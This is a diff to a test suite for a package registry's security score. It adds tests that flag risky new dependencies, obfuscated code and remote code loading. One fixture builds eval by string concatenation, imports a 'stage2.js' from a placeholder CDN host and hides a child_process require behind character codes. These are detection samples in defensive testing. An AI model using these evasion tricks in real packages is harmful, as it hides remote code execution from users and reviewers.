@@ -122,7 +122,7 @@ describe("security score", () => {
     const add = await getJson(`${reg.url}-/apm/v1/owners`, {
       method: "POST",
       headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
-      body: JSON.stringify({ name: "clean-lib", user: "mallory" }),
+      body: JSON.stringify({ name: "clean-lib", user: "mallory", password: "correct-horse-battery" }),
     });
     expect(add.status, JSON.stringify(add.body)).toBe(200);
     await publish({ name: "clean-lib", version: "1.0.1", extra: { repository: "github:alice/clean-lib", types: "index.d.ts" }, files: { "index.js": "export const add = (a, b) => a + b;\n", "index.d.ts": "export declare const add: (a: number, b: number) => number;\n" } }, mallory);
@@ -147,6 +147,52 @@ describe("security score", () => {
   test("search results include the score", async () => {
     const { body } = await getJson(`${reg.url}-/v1/search?text=clean`);
     expect(typeof dig(body, "objects", 0, "apmScore", "score")).toBe("number");
+  });
+});
+
+describe("score robustness (council round 1)", () => {
+  test("a release that adds a low-scoring dependency is flagged even when its own code is clean", async () => {
+    await publish({ name: "innocent-wrapper", version: "1.0.0", files: { "index.js": "module.exports = 1;\n" } }, alice);
+    clock += 10 * DAY;
+    await publish({ name: "innocent-wrapper", version: "1.1.0", dependencies: { dropper: "^1.0.0" }, files: { "index.js": "module.exports = require('dropper');\n" } }, alice);
+    clock += 10 * DAY;
+    const body = await score("innocent-wrapper", "1.1.0");
+    const ids = signalsOf(body).map((s) => s.id);
+    expect(ids).toContain("risky-dependency");
+    expect(JSON.stringify(dig(body, "signals"))).toContain("dropper");
+    expect(scoreOf(body)).toBeLessThan(70);
+    expect(JSON.stringify(dig(body, "changes"))).toContain("new-dependency");
+  });
+
+  test("common evasions of eval and remote code loading are still caught", async () => {
+    await publish(
+      {
+        name: "sneaky-loader",
+        version: "1.0.0",
+        files: {
+          "index.js": ["const g = globalThis;", "g['ev' + 'al'](atob('Y29uc29sZS5sb2coMSk='));", "import('https://cdn.example.com/stage2.js');", "const r = require; r(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115));"].join("\n"),
+        },
+      },
+      alice,
+    );
+    clock += 2 * DAY;
+    const ids = signalsOf(await score("sneaky-loader", "1.0.0")).map((s) => s.id);
+    expect(ids).toContain("eval");
+    expect(ids).toContain("network");
+  });
+
+  test("the report says what it could not check", async () => {
+    const body = await score("clean-lib", "1.0.0");
+    const nc = JSON.stringify(dig(body, "notChecked"));
+    expect(nc.toLowerCase()).toContain("runtime");
+  });
+
+  test("time since publish never changes the number, only the recent signal", async () => {
+    await publish({ name: "timeless", version: "1.0.0" }, alice);
+    const now = scoreOf(await score("timeless", "1.0.0"));
+    clock += 3 * DAY;
+    const later = scoreOf(await score("timeless", "1.0.0"));
+    expect(now).toBe(later);
   });
 });
 
